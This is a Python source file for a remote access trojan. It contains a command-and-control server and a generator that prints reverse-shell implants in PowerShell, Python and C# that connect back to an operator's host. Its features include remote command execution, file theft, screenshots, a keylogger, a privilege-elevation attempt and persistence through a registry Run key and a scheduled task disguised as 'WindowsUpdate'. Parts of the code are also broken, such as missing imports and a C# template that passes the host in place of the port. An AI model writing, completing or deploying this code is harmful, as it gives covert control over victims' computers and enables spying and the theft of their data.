import socket
import threading
import os
import json
import base64
import time
from datetime import datetime
import subprocess
import shutil
import zlib
from Crypto.Cipher import AES
from Crypto.Util.Padding import pad, unpad
import random
import string
import ctypes
import platform
import win32gui
import win32ui
import win32con
import win32api
from io import BytesIO
from PIL import ImageGrab
from pynput.keyboard import Listener as KeyboardListener
import pynput
import pythoncom

# ======================
# CONFIGURATION
# ======================
class Config:
    def __init__(self):
        self.HOST = "0.0.0.0"
        self.PORT = 4444
        self.LOG_FILE = "c2_log.txt"
        self.DOWNLOAD_DIR = "downloads"
        self.UPLOAD_DIR = "uploads"
        self.ENCRYPTION_KEY = b'Sixteen byte key'  # CHANGE THIS IN PRODUCTION
        self.IV = b'InitializationVe'  # CHANGE THIS IN PRODUCTION
        self.OBFUSCATION_LEVEL = 3  # 1-5 (5 being most aggressive)
        
        self.PERSISTENCE_METHODS = {
            "registry": "REG ADD HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run /v Update /t REG_SZ /d \"{path}\"",
            "scheduled_task": "schtasks /create /tn \"WindowsUpdate\" /tr \"{path}\" /sc onlogon /F"
        }

# ======================
# SECURITY COMPONENTS
# ======================
class Security:
    @staticmethod
    def encrypt(data, key, iv):
        cipher = AES.new(key, AES.MODE_CBC, iv)
        padded_data = pad(data.encode('utf-8'), AES.block_size)
        return base64.b64encode(cipher.encrypt(padded_data)).decode('utf-8')

    @staticmethod
    def decrypt(enc_data, key, iv):
        cipher = AES.new(key, AES.MODE_CBC, iv)
        decrypted = cipher.decrypt(base64.b64decode(enc_data))
        return unpad(decrypted, AES.block_size).decode('utf-8')

    @staticmethod
    def obfuscate_code(code, level=3):
        """Basic code obfuscation"""
        if level == 1:
            return code
        elif level == 2:
            # Simple variable renaming
            vars = set(re.findall(r'\b[a-zA-Z_][a-zA-Z0-9_]*\b', code))
            var_map = {}
            for var in vars:
                if len(var) > 3 and not var in ['True', 'False', 'None']:
                    var_map[var] = ''.join(random.choices(string.ascii_letters, k=random.randint(4,8)))
            
            for old, new in var_map.items():
                code = code.replace(old, new)
            return code
        else:
            # More aggressive obfuscation
            return base64.b64encode(zlib.compress(code.encode('utf-8'))).decode('utf-8')

    @staticmethod
    def generate_key():
        return os.urandom(16)

# ======================
# RAT FEATURES
# ======================
class RATFeatures:
    def __init__(self, config):
        self.config = config
        self.keylogger_active = False
        self.keylogger_buffer = ""
        self.hook_manager = None

    def execute_command(self, cmd):
        try:
            return subprocess.check_output(cmd, shell=True, stderr=subprocess.STDOUT).decode('utf-8', errors='replace')
        except Exception as e:
            return str(e)

    def upload_file(self, file_path, content):
        os.makedirs(self.config.UPLOAD_DIR, exist_ok=True)
        with open(os.path.join(self.config.UPLOAD_DIR, file_path), 'wb') as f:
            f.write(base64.b64decode(content))
        return f"File uploaded to {self.config.UPLOAD_DIR}/{file_path}"

    def download_file(self, file_path):
        try:
            with open(file_path, 'rb') as f:
                return base64.b64encode(f.read()).decode('utf-8')
        except Exception as e:
            return f"Error: {str(e)}"

    def persist(self, agent_path, method):
        persistence_cmd = self.config.PERSISTENCE_METHODS[method].format(path=agent_path)
        return self.execute_command(persistence_cmd)

    def take_screenshot(self):
        try:
            screenshot = ImageGrab.grab()
            img_byte_arr = BytesIO()
            screenshot.save(img_byte_arr, format='PNG')
            return base64.b64encode(img_byte_arr.getvalue()).decode('utf-8')
        except Exception as e:
            return f"Error: {str(e)}"

    def start_keylogger(self):
        def on_press(key):
            try:
                self.keylogger_buffer += str(key.char)
            except AttributeError:
                self.keylogger_buffer += f"[{str(key)}]"

        self.listener = KeyboardListener(on_press=on_press)
        self.listener.start()
        self.keylogger_active = True
        return "Keylogger started (pynput version)"

    def stop_keylogger(self):
        if hasattr(self, 'listener'):
            self.listener.stop()
        self.keylogger_active = False
        return "Keylogger stopped"

    def keylogger_thread(self):
        while self.keylogger_active:
            pythoncom.PumpWaitingMessages()
            time.sleep(0.1)

    def send_keylog_data(self):
        # This would send data to C2 in a real implementation
        encrypted = Security.encrypt(self.keylogger_buffer, self.config.ENCRYPTION_KEY, self.config.IV)
        # In real use, this would be sent to the C2 server
        self.keylogger_buffer = ""

    def elevate_privileges(self):
        if platform.system() != 'Windows':
            return "Privilege escalation only supported on Windows"
        
        try:
            # UAC bypass attempt
            ctypes.windll.shell32.ShellExecuteW(None, "runas", sys.executable, " ".join(sys.argv), None, None, 1)
            return "Privilege escalation attempted"
        except Exception as e:
            return f"Error: {str(e)}"

# ======================
# SERVER CORE
# ======================
class RATServer:
    def __init__(self):
        self.config = Config()
        self.features = RATFeatures(self.config)
        self.clients = {}
        self.session_data = {}
        self.server_socket = None
        self.running = False

    def log_message(self, message):
        timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        with open(self.config.LOG_FILE, "a") as f:
            f.write(f"[{timestamp}] {message}\n")
        print(f"[{timestamp}] {message}")

    def handle_client(self, client_socket, addr):
        self.log_message(f"New connection from {addr}")
        self.clients[addr] = client_socket
        self.session_data[addr] = {"current_dir": "C:\\"}
        
        try:
            while self.running:
                try:
                    encrypted_data = client_socket.recv(1024*1024)  # 1MB buffer
                    if not encrypted_data:
                        break
                        
                    try:
                        decrypted = Security.decrypt(encrypted_data.decode('utf-8'), 
                                                    self.config.ENCRYPTION_KEY, 
                                                    self.config.IV)
                        cmd_data = json.loads(decrypted)
                        response = self.process_command(addr, cmd_data)
                        
                        encrypted_response = Security.encrypt(response, 
                                                           self.config.ENCRYPTION_KEY, 
                                                           self.config.IV)
                        client_socket.send(encrypted_response.encode('utf-8'))
                    except (json.JSONDecodeError, UnicodeDecodeError) as e:
                        self.log_message(f"Invalid data from {addr}: {str(e)}")
                        continue
                        
                except socket.timeout:
                    continue
                except ConnectionResetError:
                    break
                    
        except Exception as e:
            self.log_message(f"Error with {addr}: {str(e)}")
        finally:
            client_socket.close()
            del self.clients[addr]
            del self.session_data[addr]
            self.log_message(f"Client {addr} disconnected")

    def process_command(self, addr, cmd_data):
        cmd_type = cmd_data.get("type")
        result = ""
        
        try:
            if cmd_type == "cmd":
                result = self.features.execute_command(cmd_data["command"])
            elif cmd_type == "upload":
                result = self.features.upload_file(cmd_data["file_name"], cmd_data["content"])
            elif cmd_type == "download":
                result = self.features.download_file(cmd_data["file_path"])
            elif cmd_type == "persist":
                result = self.features.persist(cmd_data["agent_path"], cmd_data["method"])
            elif cmd_type == "cd":
                try:
                    os.chdir(cmd_data["path"])
                    self.session_data[addr]["current_dir"] = os.getcwd()
                    result = f"Changed directory to {self.session_data[addr]['current_dir']}"
                except Exception as e:
                    result = str(e)
            elif cmd_type == "screenshot":
                result = self.features.take_screenshot()
            elif cmd_type == "keylogger_start":
                result = self.features.start_keylogger()
            elif cmd_type == "keylogger_stop":
                result = self.features.stop_keylogger()
            elif cmd_type == "elevate":
                result = self.features.elevate_privileges()
            else:
                result = "Unknown command type"
        except Exception as e:
            result = f"Command processing error: {str(e)}"
        
        return json.dumps({
            "success": not result.startswith("Error:"),
            "result": result,
            "current_dir": self.session_data[addr].get("current_dir", "")
        })

    def start_server(self):
        self.server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.server_socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        self.server_socket.bind((self.config.HOST, self.config.PORT))
        self.server_socket.listen(5)
        self.running = True
        self.log_message(f"C2 server started on {self.config.HOST}:{self.config.PORT}")

        try:
            while self.running:
                try:
                    client_socket, addr = self.server_socket.accept()
                    client_socket.settimeout(5.0)  # 5 second timeout
                    threading.Thread(target=self.handle_client, args=(client_socket, addr), daemon=True).start()
                except socket.timeout:
                    continue
        except KeyboardInterrupt:
            self.log_message("Server stopped by user")
        except Exception as e:
            self.log_message(f"Server error: {str(e)}")
        finally:
            self.running = False
            if self.server_socket:
                self.server_socket.close()

    def stop_server(self):
        self.running = False
        if self.server_socket:
            self.server_socket.close()

# ======================
# CLIENT INTERFACE
# ======================
class RATClientInterface:
    def __init__(self, server):
        self.server = server
        self.current_client = None

    def show_main_menu(self):
        print("\n=== Advanced RAT Menu ===")
        print("1. List connected clients")
        print("2. Interact with client")
        print("3. Start/stop server")
        print("4. Generate payload")
        print("5. Exit")
        return input("> ")

    def show_client_menu(self, addr):
        print(f"\n=== Client {addr} ===")
        print("1. Execute command")
        print("2. File operations")
        print("3. System operations")
        print("4. Persistence")
        print("5. Screenshot")
        print("6. Keylogger")
        print("7. Privilege escalation")
        print("8. Return to main")
        return input("> ")

    def file_operations_menu(self, addr):
        print("\n=== File Operations ===")
        print("1. Download file")
        print("2. Upload file")
        print("3. List directory")
        print("4. Return")
        choice = input("> ")
        
        if choice == "1":
            self.download_file(addr)
        elif choice == "2":
            self.upload_file(addr)
        elif choice == "3":
            self.list_directory(addr)

    def download_file(self, addr):
        file_path = input("Remote file path: ")
        cmd = json.dumps({"type": "download", "file_path": file_path})
        encrypted = Security.encrypt(cmd, self.server.config.ENCRYPTION_KEY, self.server.config.IV)
        
        try:
            self.server.clients[addr].send(encrypted.encode('utf-8'))
            encrypted_response = self.server.clients[addr].recv(1024*1024).decode('utf-8')
            response = json.loads(Security.decrypt(encrypted_response, 
                                                 self.server.config.ENCRYPTION_KEY, 
                                                 self.server.config.IV))
            
            if response.get("success", False):
                os.makedirs(self.server.config.DOWNLOAD_DIR, exist_ok=True)
                filename = os.path.basename(file_path)
                with open(os.path.join(self.server.config.DOWNLOAD_DIR, filename), 'wb') as f:
                    f.write(base64.b64decode(response["result"]))
                print(f"File downloaded to {self.server.config.DOWNLOAD_DIR}/{filename}")
            else:
                print(f"Error: {response.get('result', 'Unknown error')}")
        except Exception as e:
            print(f"Error: {str(e)}")

    def upload_file(self, addr):
        file_path = input("Local file path: ")
        if os.path.exists(file_path):
            with open(file_path, 'rb') as f:
                content = base64.b64encode(f.read()).decode('utf-8')
            remote_path = input("Remote save path: ")
            
            cmd = json.dumps({
                "type": "upload",
                "file_name": remote_path,
                "content": content
            })
            encrypted = Security.encrypt(cmd, self.server.config.ENCRYPTION_KEY, self.server.config.IV)
            
            try:
                self.server.clients[addr].send(encrypted.encode('utf-8'))
                encrypted_response = self.server.clients[addr].recv(1024).decode('utf-8')
                response = json.loads(Security.decrypt(encrypted_response, 
                                                     self.server.config.ENCRYPTION_KEY, 
                                                     self.server.config.IV))
                print(response.get("result", "No response"))
            except Exception as e:
                print(f"Error: {str(e)}")
        else:
            print("File not found")

    def list_directory(self, addr):
        path = input("Directory path (leave empty for current): ")
        cmd = json.dumps({
            "type": "cmd",
            "command": f"dir \"{path}\"" if path else "dir"
        })
        encrypted = Security.encrypt(cmd, self.server.config.ENCRYPTION_KEY, self.server.config.IV)
        
        try:
            self.server.clients[addr].send(encrypted.encode('utf-8'))
            encrypted_response = self.server.clients[addr].recv(1024*1024).decode('utf-8')
            response = json.loads(Security.decrypt(encrypted_response, 
                                                 self.server.config.ENCRYPTION_KEY, 
                                                 self.server.config.IV))
            print(response.get("result", "No output"))
        except Exception as e:
            print(f"Error: {str(e)}")

    def interact_with_client(self, addr):
        while True:
            choice = self.show_client_menu(addr)
            
            if choice == "1":
                self.execute_command(addr)
            elif choice == "2":
                self.file_operations_menu(addr)
            elif choice == "3":
                self.system_operations_menu(addr)
            elif choice == "4":
                self.persistence_menu(addr)
            elif choice == "5":
                self.take_screenshot(addr)
            elif choice == "6":
                self.keylogger_menu(addr)
            elif choice == "7":
                self.elevate_privileges(addr)
            elif choice == "8":
                break

    def execute_command(self, addr):
        cmd = input(f"Command ({addr}): ")
        command = json.dumps({
            "type": "cmd",
            "command": cmd
        })
        encrypted = Security.encrypt(command, self.server.config.ENCRYPTION_KEY, self.server.config.IV)
        
        try:
            self.server.clients[addr].send(encrypted.encode('utf-8'))
            encrypted_response = self.server.clients[addr].recv(1024*1024).decode('utf-8')
            response = json.loads(Security.decrypt(encrypted_response, 
                                                 self.server.config.ENCRYPTION_KEY, 
                                                 self.server.config.IV))
            print(response.get("result", "No output"))
        except Exception as e:
            print(f"Error: {str(e)}")

    def system_operations_menu(self, addr):
        print("\n=== System Operations ===")
        print("1. Get system info")
        print("2. List processes")
        print("3. Kill process")
        print("4. Get network info")
        sub_choice = input("> ")
        
        if sub_choice == "1":
            command = json.dumps({"type": "cmd", "command": "systeminfo"})
        elif sub_choice == "2":
            command = json.dumps({"type": "cmd", "command": "tasklist"})
        elif sub_choice == "3":
            pid = input("Process ID to kill: ")
            command = json.dumps({"type": "cmd", "command": f"taskkill /PID {pid} /F"})
        elif sub_choice == "4":
            command = json.dumps({"type": "cmd", "command": "ipconfig /all"})
        else:
            print("Invalid choice")
            return
            
        encrypted = Security.encrypt(command, self.server.config.ENCRYPTION_KEY, self.server.config.IV)
        
        try:
            self.server.clients[addr].send(encrypted.encode('utf-8'))
            encrypted_response = self.server.clients[addr].recv(1024*1024).decode('utf-8')
            response = json.loads(Security.decrypt(encrypted_response, 
                                                 self.server.config.ENCRYPTION_KEY, 
                                                 self.server.config.IV))
            print(response.get("result", "No output"))
        except Exception as e:
            print(f"Error: {str(e)}")

    def persistence_menu(self, addr):
        print("\n=== Persistence ===")
        print("1. Registry (Run key)")
        print("2. Scheduled Task")
        method = input("Method (1/2): ")
        agent_path = input("Agent path on target: ")
        
        method_name = "registry" if method == "1" else "scheduled_task"
        command = json.dumps({
            "type": "persist",
            "agent_path": agent_path,
            "method": method_name
        })
        encrypted = Security.encrypt(command, self.server.config.ENCRYPTION_KEY, self.server.config.IV)
        
        try:
            self.server.clients[addr].send(encrypted.encode('utf-8'))
            encrypted_response = self.server.clients[addr].recv(1024).decode('utf-8')
            response = json.loads(Security.decrypt(encrypted_response, 
                                                 self.server.config.ENCRYPTION_KEY, 
                                                 self.server.config.IV))
            print(response.get("result", "No response"))
        except Exception as e:
            print(f"Error: {str(e)}")

    def take_screenshot(self, addr):
        command = json.dumps({"type": "screenshot"})
        encrypted = Security.encrypt(command, self.server.config.ENCRYPTION_KEY, self.server.config.IV)
        
        try:
            self.server.clients[addr].send(encrypted.encode('utf-8'))
            encrypted_response = self.server.clients[addr].recv(1024*1024*5).decode('utf-8')  # Larger buffer for images
            response = json.loads(Security.decrypt(encrypted_response, 
                                                 self.server.config.ENCRYPTION_KEY, 
                                                 self.server.config.IV))
            
            if response.get("success", False):
                os.makedirs(self.server.config.DOWNLOAD_DIR, exist_ok=True)
                filename = f"screenshot_{int(time.time())}.png"
                with open(os.path.join(self.server.config.DOWNLOAD_DIR, filename), 'wb') as f:
                    f.write(base64.b64decode(response["result"]))
                print(f"Screenshot saved to {self.server.config.DOWNLOAD_DIR}/{filename}")
            else:
                print(f"Error: {response.get('result', 'Unknown error')}")
        except Exception as e:
            print(f"Error: {str(e)}")

    def keylogger_menu(self, addr):
        print("\n=== Keylogger ===")
        print("1. Start keylogger")
        print("2. Stop keylogger")
        print("3. Get keylogs")
        sub_choice = input("> ")
        
        if sub_choice == "1":
            command = json.dumps({"type": "keylogger_start"})
        elif sub_choice == "2":
            command = json.dumps({"type": "keylogger_stop"})
        else:
            print("Not implemented in this demo")
            return
            
        encrypted = Security.encrypt(command, self.server.config.ENCRYPTION_KEY, self.server.config.IV)
        
        try:
            self.server.clients[addr].send(encrypted.encode('utf-8'))
            encrypted_response = self.server.clients[addr].recv(1024).decode('utf-8')
            response = json.loads(Security.decrypt(encrypted_response, 
                                                 self.server.config.ENCRYPTION_KEY, 
                                                 self.server.config.IV))
            print(response.get("result", "No response"))
        except Exception as e:
            print(f"Error: {str(e)}")

    def elevate_privileges(self, addr):
        command = json.dumps({"type": "elevate"})
        encrypted = Security.encrypt(command, self.server.config.ENCRYPTION_KEY, self.server.config.IV)
        
        try:
            self.server.clients[addr].send(encrypted.encode('utf-8'))
            encrypted_response = self.server.clients[addr].recv(1024).decode('utf-8')
            response = json.loads(Security.decrypt(encrypted_response, 
                                                 self.server.config.ENCRYPTION_KEY, 
                                                 self.server.config.IV))
            print(response.get("result", "No response"))
        except Exception as e:
            print(f"Error: {str(e)}")

    def generate_payload(self):
        print("\n=== Payload Generator ===")
        lhost = input("C2 Server IP: ")
        lport = input("C2 Server Port: ")
        payload_type = input("Payload type (1. PowerShell / 2. Python / 3. C#): ")
        
        if payload_type == "1":
            payload = f"""
$key = [System.Text.Encoding]::UTF8.GetBytes('{self.server.config.ENCRYPTION_KEY.decode('utf-8')}')
$iv = [System.Text.Encoding]::UTF8.GetBytes('{self.server.config.IV.decode('utf-8')}')
$client = New-Object System.Net.Sockets.TCPClient("{lhost}",{lport})
$stream = $client.GetStream()

function Encrypt-Data {{
    param($data)
    $aes = New-Object System.Security.Cryptography.AesManaged
    $aes.Mode = [System.Security.Cryptography.CipherMode]::CBC
    $aes.Padding = [System.Security.Cryptography.PaddingMode]::PKCS7
    $aes.Key = $key
    $aes.IV = $iv
    $encryptor = $aes.CreateEncryptor()
    $ms = New-Object System.IO.MemoryStream
    $cs = New-Object System.Security.Cryptography.CryptoStream($ms, $encryptor, [System.Security.Cryptography.CryptoStreamMode]::Write)
    $sw = New-Object System.IO.StreamWriter($cs)
    $sw.Write($data)
    $sw.Close()
    $cs.Close()
    $ms.Close()
    $aes.Clear()
    return [System.Convert]::ToBase64String($ms.ToArray())
}}

function Decrypt-Data {{
    param($data)
    $aes = New-Object System.Security.Cryptography.AesManaged
    $aes.Mode = [System.Security.Cryptography.CipherMode]::CBC
    $aes.Padding = [System.Security.Cryptography.PaddingMode]::PKCS7
    $aes.Key = $key
    $aes.IV = $iv
    $decryptor = $aes.CreateDecryptor()
    $data = [System.Convert]::FromBase64String($data)
    $ms = New-Object System.IO.MemoryStream($data, $true)
    $cs = New-Object System.Security.Cryptography.CryptoStream($ms, $decryptor, [System.Security.Cryptography.CryptoStreamMode]::Read)
    $sr = New-Object System.IO.StreamReader($cs)
    $output = $sr.ReadToEnd()
    $sr.Close()
    $cs.Close()
    $ms.Close()
    $aes.Clear()
    return $output
}}

while($true) {{
    try {{
        $buffer = New-Object byte[] 1024
        $bytesRead = $stream.Read($buffer, 0, $buffer.Length)
        if($bytesRead -gt 0) {{
            $data = [System.Text.Encoding]::ASCII.GetString($buffer, 0, $bytesRead)
            $decrypted = Decrypt-Data $data
            $output = Invoke-Expression $decrypted 2>&1 | Out-String
            $response = Encrypt-Data $output
            $bytes = [System.Text.Encoding]::ASCII.GetBytes($response)
            $stream.Write($bytes, 0, $bytes.Length)
            $stream.Flush()
        }}
    }} catch {{ break }}
}}
$client.Close()
"""
            print("\nPowerShell payload:\n")
            print(payload)
            
        elif payload_type == "2":
            payload = f"""
import socket, subprocess, os, base64, json
from Crypto.Cipher import AES
from Crypto.Util.Padding import pad, unpad

key = b'{self.server.config.ENCRYPTION_KEY.decode('utf-8')}'
iv = b'{self.server.config.IV.decode('utf-8')}'

def encrypt(data):
    cipher = AES.new(key, AES.MODE_CBC, iv)
    return base64.b64encode(cipher.encrypt(pad(data.encode(), AES.block_size))).decode()

def decrypt(data):
    cipher = AES.new(key, AES.MODE_CBC, iv)
    return unpad(cipher.decrypt(base64.b64decode(data)), AES.block_size).decode()

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect(("{lhost}", {lport}))

while True:
    try:
        data = s.recv(1024).decode()
        if not data: break
        decrypted = decrypt(data)
        result = subprocess.check_output(decrypted, shell=True, stderr=subprocess.STDOUT)
        s.send(encrypt(result.decode()))
    except Exception as e:
        s.send(encrypt(str(e)))
"""
            print("\nPython payload:\n")
            print(payload)
            
        elif payload_type == "3":
            payload = f"""
using System;
using System.Net.Sockets;
using System.Text;
using System.Security.Cryptography;
using System.IO;
using System.Diagnostics;

class Program {{
    static byte[] key = Encoding.UTF8.GetBytes("{self.server.config.ENCRYPTION_KEY.decode('utf-8')}");
    static byte[] iv = Encoding.UTF8.GetBytes("{self.server.config.IV.decode('utf-8')}");
    
    static string Encrypt(string plainText) {{
        using (Aes aes = Aes.Create()) {{
            aes.Key = key;
            aes.IV = iv;
            ICryptoTransform encryptor = aes.CreateEncryptor();
            using (MemoryStream ms = new MemoryStream()) {{
                using (CryptoStream cs = new CryptoStream(ms, encryptor, CryptoStreamMode.Write)) {{
                    using (StreamWriter sw = new StreamWriter(cs)) {{
                        sw.Write(plainText);
                    }}
                    return Convert.ToBase64String(ms.ToArray());
                }}
            }}
        }}
    }}
    
    static string Decrypt(string cipherText) {{
        using (Aes aes = Aes.Create()) {{
            aes.Key = key;
            aes.IV = iv;
            ICryptoTransform decryptor = aes.CreateDecryptor();
            using (MemoryStream ms = new MemoryStream(Convert.FromBase64String(cipherText))) {{
                using (CryptoStream cs = new CryptoStream(ms, decryptor, CryptoStreamMode.Read)) {{
                    using (StreamReader sr = new StreamReader(cs)) {{
                        return sr.ReadToEnd();
                    }}
                }}
            }}
        }}
    }}
    
    static void Main() {{
        TcpClient client = new TcpClient("{lhost}", {lhost});
        NetworkStream stream = client.GetStream();
        byte[] buffer = new byte[1024];
        
        while (true) {{
            try {{
                int bytesRead = stream.Read(buffer, 0, buffer.Length);
                if (bytesRead > 0) {{
                    string data = Encoding.ASCII.GetString(buffer, 0, bytesRead);
                    string decrypted = Decrypt(data);
                    
                    Process proc = new Process();
                    proc.StartInfo.FileName = "cmd.exe";
                    proc.StartInfo.Arguments = $"/c {{decrypted}}";
                    proc.StartInfo.UseShellExecute = false;
                    proc.StartInfo.RedirectStandardOutput = true;
                    proc.Start();
                    
                    string output = proc.StandardOutput.ReadToEnd();
                    proc.WaitForExit();
                    
                    string response = Encrypt(output);
                    byte[] bytes = Encoding.ASCII.GetBytes(response);
                    stream.Write(bytes, 0, bytes.Length);
                }}
            }} catch {{ break; }}
        }}
        client.Close();
    }}
}}
"""
            print("\nC# payload:\n")
            print(payload)
        
        save = input("\nSave to file? (y/n): ")
        if save.lower() == 'y':
            filename = input("Filename: ")
            with open(filename, 'w') as f:
                f.write(payload)
            print(f"Payload saved to {filename}")

    def run(self):
        # Create necessary directories
        os.makedirs(self.server.config.DOWNLOAD_DIR, exist_ok=True)
        os.makedirs(self.server.config.UPLOAD_DIR, exist_ok=True)
        
        # Start server thread if not already running
        if not self.server.running:
            server_thread = threading.Thread(target=self.server.start_server, daemon=True)
            server_thread.start()
            time.sleep(1)  # Give server time to start
        
        while True:
            choice = self.show_main_menu()
            
            if choice == "1":
                self.list_clients()
            elif choice == "2":
                self.select_client()
            elif choice == "3":
                self.toggle_server()
            elif choice == "4":
                self.generate_payload()
            elif choice == "5":
                print("Exiting...")
                self.server.stop_server()
                break

    def list_clients(self):
        print("\nConnected clients:")
        for i, addr in enumerate(self.server.clients):
            print(f"{i+1}. {addr}")

    def select_client(self):
        if not self.server.clients:
            print("No clients connected!")
            return
        
        self.list_clients()
        try:
            client_num = int(input("Select client: ")) - 1
            addr = list(self.server.clients.keys())[client_num]
            self.interact_with_client(addr)
        except (ValueError, IndexError):
            print("Invalid selection!")

    def toggle_server(self):
        if self.server.running:
            self.server.stop_server()
            print("Server stopped")
        else:
            server_thread = threading.Thread(target=self.server.start_server, daemon=True)
            server_thread.start()
            print("Server started in background")

# ======================
# MAIN EXECUTION
# ======================
if __name__ == "__main__":
    try:
        server = RATServer()
        interface = RATClientInterface(server)
        interface.run()
    except KeyboardInterrupt:
        print("\nExiting...")
    except Exception as e:
        print(f"Fatal error: {str(e)}")